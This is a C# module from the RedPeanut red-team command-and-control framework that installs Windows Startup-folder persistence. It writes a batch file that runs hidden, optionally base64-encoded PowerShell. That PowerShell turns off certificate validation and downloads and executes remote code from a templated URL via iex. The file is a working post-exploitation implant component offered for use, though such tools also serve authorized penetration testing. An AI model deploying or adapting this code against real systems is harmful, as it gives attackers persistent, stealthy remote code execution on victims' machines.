//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.IO;
using System.Text;

class PersStartup
{
    static bool encoded = bool.Parse("#ENCODED#");
    static string commandsrc = @"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};iex((New-Object system.net.WebClient).DownloadString('#URL#'))";
    
    static string command = @"@echo off
start cmd /c powershell -w 1 -c ""#PAYLOAD#""
exit";
    static string commandenc = @"@echo off
start cmd /c powershell -w 1 -enc #PAYLOAD#
exit";

    static string filename = "#FILENAME#";

    public static void Execute(string[] args)
    {
        if (SharpSploit.Persistence.Startup.InstallStartup(GetEncodedScript(encoded), filename))
            Console.WriteLine("[*] Startup installed");
        else
            Console.WriteLine("[*] Startup not installed");
    }

    private static string GetEncodedScript(bool encoded)
    {
        if (encoded)
            return commandenc.Replace("#PAYLOAD#",Convert.ToBase64String(Encoding.Unicode.GetBytes(commandsrc)));
        else
            return command.Replace("#PAYLOAD#",commandsrc);
    }

    
}
